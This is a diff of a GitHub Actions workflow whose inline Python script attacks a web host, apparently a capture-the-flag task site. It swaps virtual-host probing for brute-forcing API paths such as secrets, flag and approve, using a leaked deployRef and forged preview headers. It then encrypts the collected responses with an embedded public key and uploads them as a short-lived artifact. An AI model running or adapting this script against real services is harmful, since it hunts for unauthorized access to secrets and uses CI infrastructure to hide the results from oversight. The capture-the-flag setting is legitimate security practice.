@@ -12,7 +12,7 @@ jobs:
     runs-on: ubuntu-latest
     timeout-minutes: 5
     steps:
-      - name: Probe deployRef-derived virtual hosts and encrypt responses
+      - name: Probe export/release paths derived from deployRef
         shell: bash
         run: |
           set -euo pipefail
@@ -30,48 +30,33 @@ jobs:
           -----END PUBLIC KEY-----
           PEM
           python3 - <<'PY'
-          import socket,ssl,requests,pathlib,json,urllib.parse
-          basehost='task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru'
-          ref='preview-8b11c'; out=pathlib.Path('package/out')
-          hosts=[
-            f'{ref}.{basehost}',
-            f'{ref}.caplag-task.ru',
-            f'{ref}-task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru',
-            f'task-launchlet-web-medium-18cf6be4db586bb6-{ref}.caplag-task.ru',
-            f'{ref}.task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru',
-            f'launchlet-demo-board.{basehost}',
-            f'preview.{basehost}',
-          ]
-          res=[]
-          for h in hosts:
-            item={'host':h}
-            try:item['dns']=sorted(set(x[4][0] for x in socket.getaddrinfo(h,443,type=socket.SOCK_STREAM)))
-            except Exception as e:item['dns_error']=repr(e)
-            if item.get('dns'):
-              for scheme in ['https','http']:
-                try:
-                  r=requests.get(f'{scheme}://{h}/',timeout=10,allow_redirects=False,verify=True)
-                  item[scheme]={'status':r.status_code,'headers':dict(r.headers),'body':r.text[:20000]}
-                except Exception as e:item[scheme+'_error']=repr(e)
-            res.append(item)
-          # Also route to the known task IP/TLS endpoint while varying Host only.
-          try: ips=sorted(set(x[4][0] for x in socket.getaddrinfo(basehost,443,type=socket.SOCK_STREAM)))
-          except Exception: ips=[]
-          ctx=ssl.create_default_context(); vhosts=[]
-          for vh in [ref,f'{ref}.{basehost}',f'{ref}.caplag-task.ru',f'launchlet-demo-board.{basehost}',f'preview.{basehost}']:
+          import requests,pathlib,urllib.parse,json,itertools
+          base='https://task-launchlet-web-medium-18cf6be4db586bb6.caplag-task.ru/'
+          out=pathlib.Path('package/out'); s=requests.Session(); s.headers['User-Agent']='Mozilla/5.0'
+          boot=s.get(urllib.parse.urljoin(base,'/api/app/bootstrap'),timeout=10).json(); refs=s.get(urllib.parse.urljoin(base,boot['api']['serverReferences']),timeout=10).json(); act=refs['serverActions']['inspectDeploy']
+          H={'Accept':'application/json','Content-Type':'application/json','X-Launchlet-Preview':boot['project']}
+          inv=s.post(urllib.parse.urljoin(base,act['endpoint']),headers=H,json={'actionId':act['id'],'args':{'workspaceId':boot['workspace'],'projectId':boot['project']}},timeout=10).json(); ref=inv['inspector']['deployRef']
+          roots=['deploy','deployment','deploys','deployments','preview','previews','inspect','inspector','artifact','artifacts','release','releases','publish','publishes']
+          ops=['export','release','publish','promote','finalize','approve','approval','review','download','artifact','artifacts','flag','secrets','secret','metadata','details','status','open','inspect','production','enterprise','rollout']
+          paths=set()
+          for root,op in itertools.product(roots,ops):
+            paths.add(f'/api/{root}/{ref}/{op}'); paths.add(f'/api/{root}/{op}/{ref}')
+          bodies=[{}, {'deployRef':ref},{'deploy_ref':ref},{'ref':ref},{'id':ref},{'projectId':boot['project'],'workspaceId':boot['workspace'],'deployRef':ref}]
+          hits=[]
+          for path in sorted(paths):
+            u=urllib.parse.urljoin(base,path)
             try:
-              with socket.create_connection((basehost,443),timeout=10) as raw:
-                with ctx.wrap_socket(raw,server_hostname=basehost) as ss:
-                  ss.sendall((f'GET / HTTP/1.1\r\nHost: {vh}\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n').encode())
-                  data=b''
-                  while True:
-                    c=ss.recv(65536)
-                    if not c:break
-                    data+=c
-              head,_,body=data.partition(b'\r\n\r\n'); first=head.split(b'\r\n',1)[0].decode('latin1','replace')
-              vhosts.append({'host_header':vh,'status_line':first,'headers':head.decode('latin1','replace'),'body':body.decode('utf-8','replace')[:20000]})
-            except Exception as e:vhosts.append({'host_header':vh,'error':repr(e)})
-          (out/'summary.json').write_text(json.dumps({'hosts':res,'known_ips':ips,'vhosts':vhosts},indent=2))
+              r=s.get(u,headers=H,timeout=6,allow_redirects=False)
+              if r.status_code!=404:hits.append({'path':path,'method':'GET','status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+            except Exception:pass
+            for b in bodies:
+              try:
+                r=s.post(u,headers=H,json=b,timeout=6,allow_redirects=False)
+                if r.status_code!=404:
+                  hits.append({'path':path,'method':'POST','sent':b,'status':r.status_code,'body':r.text,'headers':dict(r.headers)})
+                  if 'caplag{' in r.text:break
+              except Exception:pass
+          (out/'summary.json').write_text(json.dumps({'deployRef':ref,'hits':hits},indent=2))
           PY
           tar -C package/out -czf package/result.tgz .
           openssl rand 32 > package/aes.key
@@ -87,6 +72,6 @@ jobs:
           rm -rf package
       - uses: actions/upload-artifact@v4
         with:
-          name: launchlet-part2-vhost-encrypted
+          name: launchlet-part2-ref-export-encrypted
           path: artifact/
           retention-days: 1
